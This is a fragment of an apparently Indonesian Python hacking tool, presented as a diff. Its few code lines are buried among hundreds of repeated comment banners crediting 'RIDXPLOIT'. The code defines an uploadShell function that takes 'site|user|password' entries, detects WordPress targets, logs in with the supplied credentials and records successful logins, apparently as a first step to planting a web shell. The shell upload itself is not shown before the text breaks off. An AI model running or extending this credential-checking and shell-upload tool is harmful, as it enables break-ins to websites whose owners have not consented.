+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+def uploadShell(site):
+    site = site.strip()
+    try:
+        parts = site.split('|')
+        if len(parts) < 3:
+            print(f"{Y}[!] {site} --> Format Salah{W}")
+            return
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+        url_raw, user, pasw = parts
+        parsed = urllib.parse.urlparse(url_raw if '://' in url_raw else 'http://' + url_raw)
+
+        try:
+            hostname = idna.encode(parsed.hostname).decode()
+        except:
+            print(f'{R}[×] Domain tidak valid: {parsed.hostname}{W}')
+            return
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+        url = f"{parsed.scheme or 'http'}://{hostname}{parsed.path or ''}"
+        session = requests.Session()
+        headers = generate_headers()
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+        response = session.get(url, timeout=10, headers=headers)
+        if response.status_code in [200, 403] and ('wp-login.php' in response.text or 'wordpress' in response.text.lower()):
+            login = session.post(url, headers=headers, data={'log': user, 'pwd': pasw}, timeout=10)
+            if any(x in login.text for x in ['wp-admin/profile.php', 'dashboard', 'redirect_to']):
+                print(f"{G}[+] {url_raw} --> LoginSuccess{W}")
+                flags = []
+                new_entry = f"{url_raw}|{user}|{pasw}"
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
